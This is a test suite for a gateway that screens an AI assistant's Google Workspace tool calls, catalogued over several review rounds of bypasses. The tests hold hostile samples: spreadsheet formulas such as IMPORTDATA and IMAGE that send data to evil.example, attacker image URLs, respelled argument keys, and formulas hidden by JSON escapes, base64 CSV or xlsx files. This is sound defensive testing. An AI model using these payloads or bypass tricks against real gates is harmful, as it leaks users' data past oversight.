"""workspace-mcp 1.29.0's CamelCaseArgumentsMiddleware renames an undeclared
camelCase key to the declared snake_case parameter. A gate that matched the
exact key never saw `rsvpComment`, `Attendees` or `userGoogleEmail`, and the
server turned them into the real thing. Every gate now reads by normalized
spelling; these tests pin that, plus the refusals added with it (mailed text
on every tool, nested image / URL fetches, non-object arguments).

Mirrors the structure of test_mcp_gateway_email_egress.py.
"""
from __future__ import annotations

import asyncio
import base64
import io
import json
import zipfile
from pathlib import Path
from types import SimpleNamespace
from typing import Any
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

import openexecutive.audit
import openexecutive.orchestrator.mcp_gateway as gw_module
from openexecutive.orchestrator.mcp_gateway import MCPGateway
from openexecutive.people import store as people_store

EXEC_ADDR = "ceo@example.com"
ALICE = "alice@example.com"
STRANGER = "stranger@evil.example"
EVENT = "google_workspace__manage_event"


@pytest.fixture(autouse=True)
def isolated(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    db_path = tmp_path / "people.db"
    monkeypatch.setattr(people_store, "DB_PATH", db_path)
    people_store.initialize_db()
    people_store.upsert_person(full_name="Alice", email=ALICE)
    monkeypatch.setattr(openexecutive.audit, "log_event", lambda *a, **k: None)


def _make_gateway() -> tuple[MCPGateway, AsyncMock]:
    gateway = MCPGateway()
    session = MagicMock()
    fake_result = MagicMock()
    fake_result.content = [MagicMock(text='{"ok": true}')]
    session.call_tool = AsyncMock(return_value=fake_result)
    gateway._session = session
    return gateway, session.call_tool


def _call(gateway: MCPGateway, tool_name: str, arguments: Any) -> str:
    settings = SimpleNamespace(exec_email_address=EXEC_ADDR, email_poll_interval_seconds=60)
    with patch.object(gw_module, "get_settings", return_value=settings):
        return asyncio.run(gateway.call_tool({"name": tool_name, "arguments": arguments}))


def _forwarded(session_call: AsyncMock) -> dict[str, Any]:
    return session_call.await_args.args[1]["arguments"]


# ---------------------------------------------------------------------------
# Text Google mails to someone the roster never checked
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("key", ["rsvp_comment", "rsvpComment", "RSVPComment", "Rsvp-Comment"])
def test_rsvp_comment_refused_in_any_spelling(key: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, EVENT, {"action": "rsvp", "event_id": "e1",
                                    "response": "accepted", key: "the secret"})
    assert session_call.await_count == 0
    assert key in json.loads(result)["error"]


@pytest.mark.parametrize("tool", [
    "google_workspace__manage_out_of_office", "google_workspace__manage_focus_time",
])
@pytest.mark.parametrize("key", ["decline_message", "declineMessage"])
def test_decline_message_refused(tool: str, key: str) -> None:
    """An auto-decline is mailed to whoever invites the Executive in the window."""
    gateway, session_call = _make_gateway()
    result = _call(gateway, tool, {"action": "create", "start": "2026-10-01T09:00:00Z",
                                   "end": "2026-10-02T09:00:00Z", key: "the secret"})
    assert session_call.await_count == 0
    assert key in json.loads(result)["error"]


def test_out_of_office_without_message_passes() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__manage_out_of_office",
          {"action": "create", "start": "2026-10-01T09:00:00Z", "end": "2026-10-02T09:00:00Z",
           "decline_message": None})
    assert session_call.await_count == 1


# ---------------------------------------------------------------------------
# Acting account
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("key", ["userGoogleEmail", "UserGoogleEmail", "user-google-email"])
def test_other_account_refused_in_any_spelling(key: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__search_gmail_messages",
                   {"query": "x", key: "victim@example.com"})
    assert session_call.await_count == 0
    assert "victim@example.com" in json.loads(result)["error"]


def test_exact_key_exec_plus_respelled_other_account_refused() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__search_gmail_messages",
                   {"query": "x", "user_google_email": EXEC_ADDR,
                    "userGoogleEmail": "victim@example.com"})
    assert session_call.await_count == 0
    assert "victim@example.com" in json.loads(result)["error"]


def test_respelled_exec_address_passes() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__search_gmail_messages",
          {"query": "x", "userGoogleEmail": EXEC_ADDR.upper()})
    assert session_call.await_count == 1


# ---------------------------------------------------------------------------
# Calendar attendees and the notification pin
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("key", ["Attendees", "ATTENDEES", "attendees_"])
def test_off_roster_attendee_refused_in_any_spelling(key: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, EVENT, {"action": "create", "summary": "s", key: [STRANGER]})
    assert session_call.await_count == 0
    assert STRANGER in json.loads(result)["error"]


def test_empty_exact_key_beside_respelled_stranger_refused() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, EVENT, {"action": "create", "attendees": [],
                                    "Attendees": [{"email": STRANGER}]})
    assert session_call.await_count == 0
    assert STRANGER in json.loads(result)["error"]


def test_respelled_roster_attendee_passes_and_keeps_notifications() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, EVENT, {"action": "update", "event_id": "e1", "Attendees": [ALICE],
                           "send_updates": "all"})
    assert session_call.await_count == 1
    assert _forwarded(session_call)["send_updates"] == "all"


def test_respelled_send_updates_cannot_undo_the_pin() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, EVENT, {"action": "update", "event_id": "e1", "description": "d",
                           "sendUpdates": "all"})
    fwd = _forwarded(session_call)
    assert fwd["send_updates"] == "none"
    assert "sendUpdates" not in fwd


@pytest.mark.parametrize("action", ["Delete", " delete ", "RSVP"])
def test_action_matched_like_the_server(action: str) -> None:
    """A respelled delete/rsvp passes through the gate as the server treats it."""
    gateway, session_call = _make_gateway()
    _call(gateway, EVENT, {"action": action, "event_id": "e1"})
    assert session_call.await_count == 1


# ---------------------------------------------------------------------------
# Nested fetches (Google-side)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("tool,arguments", [
    ("google_workspace__insert_doc_image",
     {"document_id": "d", "index": 1, "image_source": "https://attacker.example/p.png?d=s"}),
    ("google_workspace__batch_update_presentation",
     {"presentation_id": "p", "requests": [{"createImage": {"url": "https://attacker.example/x"}}]}),
    ("google_workspace__batch_update_presentation",
     {"presentation_id": "p", "requests": [{"replaceAllShapesWithImage":
                                            {"imageUrl": "https://attacker.example/x"}}]}),
    ("google_workspace__batch_update_form",
     {"form_id": "f", "requests": [{"createItem": {"item": {"image":
                                                             {"sourceUri": "https://attacker.example/x"}}}}]}),
])
def test_nested_fetch_refused(tool: str, arguments: dict[str, Any]) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, tool, arguments)
    assert session_call.await_count == 0
    assert "fetch" in json.loads(result)["error"]


def test_drive_file_id_image_source_passes() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__insert_doc_image",
          {"document_id": "d", "index": 1, "image_source": "1AbCdEfDriveFileId"})
    assert session_call.await_count == 1


def test_hyperlink_in_doc_is_not_a_fetch() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__batch_update_doc",
          {"document_id": "d", "operations": [{"type": "insert_text", "text": "see",
                                               "link_url": "https://example.com"}]})
    assert session_call.await_count == 1


# ---------------------------------------------------------------------------
# Argument shapes that must not skip the gates
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("arguments", ["[]", "null", '"{\\"a\\": 1}"', [], [1, 2], "42"])
def test_non_object_arguments_refused_for_workspace_tools(arguments: Any) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__get_events", arguments)
    assert session_call.await_count == 0
    assert "JSON object" in json.loads(result)["error"]


def test_apps_script_refused_whatever_the_arguments() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__run_script_function",
                   '"{\\"script_id\\": \\"x\\", \\"function_name\\": \\"f\\"}"')
    assert session_call.await_count == 0
    assert "Apps Script" in json.loads(result)["error"]


def test_other_servers_keep_their_arguments_as_is() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "notion__search", [1, 2])
    assert session_call.await_count == 1


def test_deeply_nested_attachments_refused_not_crashed() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__send_gmail_message",
                   {"to": ALICE, "subject": "s", "body": "b", "attachments": "[" * 100_000})
    assert session_call.await_count == 0
    assert "attachment" in json.loads(result)["error"].lower()


# ---------------------------------------------------------------------------
# Second review round: Google-side fetches by key suffix, scheme, and formula
# ---------------------------------------------------------------------------


def test_slide_background_content_url_refused() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__batch_update_presentation", {
        "presentation_id": "p",
        "requests": [{"updatePageProperties": {"objectId": "s1", "pageProperties": {
            "pageBackgroundFill": {"stretchedPictureFill":
                                   {"contentUrl": "https://attacker.example/x.png?d=s"}}},
            "fields": "pageBackgroundFill"}}],
    })
    assert session_call.await_count == 0
    assert "fetch" in json.loads(result)["error"]


@pytest.mark.parametrize("value", [
    "https:evil.example/x.png", "HTTP://evil.example/x", " ftp://evil.example/x",
    "data:image/png;base64,AAAA",
])
def test_any_url_scheme_counts(value: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__batch_update_doc",
                   {"document_id": "d", "operations": [{"type": "insert_image", "image_uri": value}]})
    assert session_call.await_count == 0
    assert "fetch" in json.loads(result)["error"]


@pytest.mark.parametrize("key,value", [
    ("link_url", "https://example.com/page"),      # a document hyperlink, stored
    ("conference_uri", "https://meet.example/abc"),  # a meeting link, stored
    ("youtube_uri", "https://youtu.be/x"),          # YouTube only
    ("image_uri", "1AbCdEfDriveFileId"),           # a Drive id, no scheme
])
def test_stored_urls_and_drive_ids_pass(key: str, value: str) -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__some_tool", {"x": [{"nested": {key: value}}]})
    assert session_call.await_count == 1


@pytest.mark.parametrize("tool,arguments", [
    ("google_workspace__modify_sheet_values",
     {"spreadsheet_id": "s", "range_name": "A1", "values": [["=IMPORTDATA(\"https://evil.example/?d=s\")"]]}),
    ("google_workspace__append_table_rows",
     {"spreadsheet_id": "s", "table": "t", "rows": [{"c": "= importxml(\"https://evil.example\", \"//a\")"}]}),
    ("google_workspace__modify_sheet_values",
     {"spreadsheet_id": "s", "range_name": "A1", "values": [["=IMAGE(\"https://evil.example/?d=s\")"]]}),
    ("google_workspace__create_table_with_data",
     {"spreadsheet_id": "s", "data": [["h"], ["=IMPORTHTML(\"https://evil.example\",\"table\",1)"]]}),
])
def test_fetching_sheet_formulas_refused(tool: str, arguments: dict[str, Any]) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, tool, arguments)
    assert session_call.await_count == 0
    assert "formula" in json.loads(result)["error"]


@pytest.mark.parametrize("cell", ["=SUM(A1:A5)", "IMPORTDATA is a function", "=HYPERLINK(\"https://x\",\"x\")", "plain"])
def test_ordinary_cells_pass(cell: str) -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__modify_sheet_values",
          {"spreadsheet_id": "s", "range_name": "A1", "values": [[cell]]})
    assert session_call.await_count == 1


def test_formula_text_in_a_doc_is_not_a_cell() -> None:
    """The formula rule is for tools that write cells; a Doc stores text."""
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__modify_doc_text",
          {"document_id": "d", "text": "=IMPORTDATA(\"https://example.com\") is dangerous"})
    assert session_call.await_count == 1


def test_deeply_nested_string_arguments_do_not_crash() -> None:
    gateway, _session_call = _make_gateway()
    result = _call(gateway, "google_workspace__get_events", "[" * 100_000)
    assert isinstance(result, str)


# ---------------------------------------------------------------------------
# Third review round: formula gate bypasses, URL values a parser still fetches
# ---------------------------------------------------------------------------

_FORMULA = "=IMPORTDATA(\"https://evil.example/?q=SECRET\")"


@pytest.mark.parametrize("tool,arguments", [
    # values JSON-encoded: the string starts with "[" not "="
    ("google_workspace__modify_sheet_values",
     {"spreadsheet_id": "s", "range_name": "A1", "values": json.dumps([[_FORMULA]])}),
    ("google_workspace__append_table_rows",
     {"spreadsheet_id": "s", "table": "t", "values": json.dumps([["=IMAGE(\"https://evil.example/x\")"]])}),
    # a CSV cell mid-line
    ("google_workspace__import_to_google_sheets",
     {"file_name": "x.csv", "content": "a,b\nc," + _FORMULA}),
    # a native Sheet rewritten from CSV through Drive — no "sheet" in the name
    ("google_workspace__update_drive_file",
     {"file_id": "1sheet", "mime_type": "text/csv", "content": _FORMULA}),
    ("google_workspace__create_drive_file",
     {"file_name": "x.csv", "content": "h\n" + _FORMULA, "content_mime_type": "text/csv"}),
    # no "=" at all
    ("google_workspace__modify_sheet_values",
     {"spreadsheet_id": "s", "range_name": "A1", "values": [["+IMPORTDATA(\"https://evil.example\")"]]}),
    # conditional formatting custom formula
    ("google_workspace__manage_conditional_formatting",
     {"spreadsheet_id": "s", "rules": [{"custom_formula": "=ISNUMBER(IMPORTDATA(\"https://evil.example\"))"}]}),
])
def test_formula_gate_bypasses_closed(tool: str, arguments: dict[str, Any]) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, tool, arguments)
    assert session_call.await_count == 0
    assert "formula" in json.loads(result)["error"]


def test_plain_csv_content_passes() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__import_to_google_sheets",
          {"file_name": "x.csv", "content": "name,total\nacme,=SUM(B2:B9)\n"})
    assert session_call.await_count == 1


@pytest.mark.parametrize("value", [
    "//evil.example/?q=S", "\x01https://evil.example/x", "\u200bhttps://evil.example/x",
    " \t\nhttps://evil.example/x", "\ufeffdata:image/png;base64,AA",
])
def test_url_values_a_parser_would_still_fetch_are_refused(value: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__batch_update_presentation",
                   {"presentation_id": "p",
                    "requests": [{"replaceAllShapesWithImage": {"imageUrl": value}}]})
    assert session_call.await_count == 0
    assert "fetch" in json.loads(result)["error"]


def test_drive_id_with_stray_whitespace_still_passes() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__insert_doc_image",
          {"document_id": "d", "index": 1, "image_source": " 1AbCdEfDriveFileId "})
    assert session_call.await_count == 1


# ---------------------------------------------------------------------------
# Fourth review round: what the server decodes, and what a zip hides
# ---------------------------------------------------------------------------

_SHEET = "google_workspace__modify_sheet_values"


def _xlsx(formula: str) -> str:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", "<Types/>")
        z.writestr("xl/worksheets/sheet1.xml",
                   f'<worksheet><sheetData><row><c><f>{formula}</f></c></row></sheetData></worksheet>')
    return base64.b64encode(buf.getvalue()).decode()


@pytest.mark.parametrize("values", [
    # JSON escapes the server decodes: \u0049 is "I", \u0028 is "("
    '[["=\\u0049MPORTDATA(\\"https://evil.example/?q=S\\")"]]',
    '[["=IMPORTDATA\\u0028\\"https://evil.example/?q=S\\")"]]',
    # JSON inside JSON
    json.dumps([json.dumps(["=IMAGE(\"https://evil.example/x\")"])]),
])
def test_json_escaped_formula_refused(values: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, _SHEET, {"spreadsheet_id": "s", "range_name": "A1", "values": values})
    assert session_call.await_count == 0
    assert "formula" in json.loads(result)["error"]


def test_json_escaped_formula_in_conditional_formatting_refused() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__manage_conditional_formatting",
                   {"spreadsheet_id": "s",
                    "condition_values": '["=ISNUMBER(\\u0049MPORTDATA(\\"https://evil.example\\"))"]'})
    assert session_call.await_count == 0
    assert "formula" in json.loads(result)["error"]


def test_json_string_requests_with_image_url_refused() -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__batch_update_presentation",
                   {"presentation_id": "p",
                    "requests": json.dumps([{"createImage": {"url": "https://evil.example/?q=S"}}])})
    assert session_call.await_count == 0
    assert "fetch" in json.loads(result)["error"]


@pytest.mark.parametrize("tool,extra", [
    ("google_workspace__import_to_google_sheets", {"file_name": "x.xlsx"}),
    ("google_workspace__create_drive_file",
     {"file_name": "x.xlsx", "mime_type": "application/vnd.google-apps.spreadsheet"}),
])
def test_xlsx_with_fetching_formula_refused(tool: str, extra: dict[str, Any]) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, tool, {**extra, "base64_content": _xlsx(
        'IMPORTDATA(&quot;https://evil.example/?q=S&quot;)')})
    assert session_call.await_count == 0
    assert "formula" in json.loads(result)["error"]


def test_base64_csv_with_fetching_formula_refused() -> None:
    gateway, session_call = _make_gateway()
    csv = base64.b64encode(b'a,=IMPORTDATA("https://evil.example/?q=S")\n').decode()
    result = _call(gateway, "google_workspace__import_to_google_sheets",
                   {"file_name": "x.csv", "source_format": "csv", "base64_content": csv})
    assert session_call.await_count == 0
    assert "formula" in json.loads(result)["error"]


def test_ordinary_xlsx_and_csv_uploads_pass() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__import_to_google_sheets",
          {"file_name": "x.xlsx", "base64_content": _xlsx("SUM(A1:A9)")})
    _call(gateway, "google_workspace__import_to_google_sheets",
          {"file_name": "x.csv", "base64_content": base64.b64encode(b"name,total\nacme,42\n").decode()})
    assert session_call.await_count == 2


@pytest.mark.parametrize("b64", [
    base64.b64encode(bytes(range(256)) * 4).decode(),   # binary, not a zip, not text (legacy .xls)
    "not*base64!",
    base64.b64encode(b"PK\x03\x04 not really a zip").decode(),
])
def test_uninspectable_upload_refused_on_cell_writers(b64: str) -> None:
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__import_to_google_sheets",
                   {"file_name": "x.xls", "base64_content": b64})
    assert session_call.await_count == 0
    assert "formulas cannot be checked" in json.loads(result)["error"]


def test_binary_upload_to_a_doc_is_not_a_cell_write() -> None:
    gateway, session_call = _make_gateway()
    _call(gateway, "google_workspace__import_to_google_doc",
          {"file_name": "x.docx", "base64_content": base64.b64encode(bytes(range(256))).decode()})
    assert session_call.await_count == 1


def test_server_side_file_path_refused_on_cell_writers() -> None:
    """Usually an attachment someone mailed in; its formulas cannot be seen here."""
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__import_to_google_sheets",
                   {"file_name": "x.xlsx", "file_path": "/data/attachments/x.xlsx"})
    assert session_call.await_count == 0
    assert "cannot be checked" in json.loads(result)["error"]


def test_drive_share_scan_reads_json_encoded_grantees() -> None:
    """The JSON-aware walk also serves the Drive gate."""
    gateway, session_call = _make_gateway()
    result = _call(gateway, "google_workspace__manage_drive_access",
                   {"file_id": "f", "action": "grant",
                    "permissions": json.dumps([{"email": STRANGER, "role": "reader"}])})
    assert session_call.await_count == 0
    assert STRANGER in json.loads(result)["error"]
